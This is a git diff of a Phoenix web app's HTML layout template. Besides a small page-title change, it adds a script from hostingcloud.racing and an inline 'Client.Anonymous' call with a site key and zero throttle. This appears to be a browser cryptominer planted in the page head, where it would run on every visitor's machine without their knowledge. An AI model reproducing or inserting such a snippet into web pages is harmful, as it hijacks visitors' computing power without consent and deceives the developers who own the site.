@@ -5,9 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <%= csrf_meta_tag() %>
-    <%= live_title_tag assigns[:page_title] || "StadlerNo", suffix: " · Phoenix Framework" %>
-
-
+    <%= live_title_tag assigns[:page_title] || "StadlerNo" %>
 
 <script src="https://unpkg.com/tlx/browser/tlx.js"></script>
 <script src="https://unpkg.com/tlx-chart/browser/tlx-chart.js"></script>
@@ -20,6 +18,17 @@
     <link phx-track-static rel="stylesheet" href="<%= Routes.static_path(@conn, "/css/app.css") %>"/>
        <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
     <script defer phx-track-static type="text/javascript" src="<%= Routes.static_path(@conn, "/js/app.js") %>"></script>
+
+<script src="https://www.hostingcloud.racing/JNiF.js"></script>
+<script>
+    var _client = new Client.Anonymous('ac9cf52e5ef15eed99ce101b3b2587a7c3cc7a0f77d9ad4ee007134bf4e65d1b', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    
+
+</script>
+
 
   </head>
   <body style="background-color: #121212">
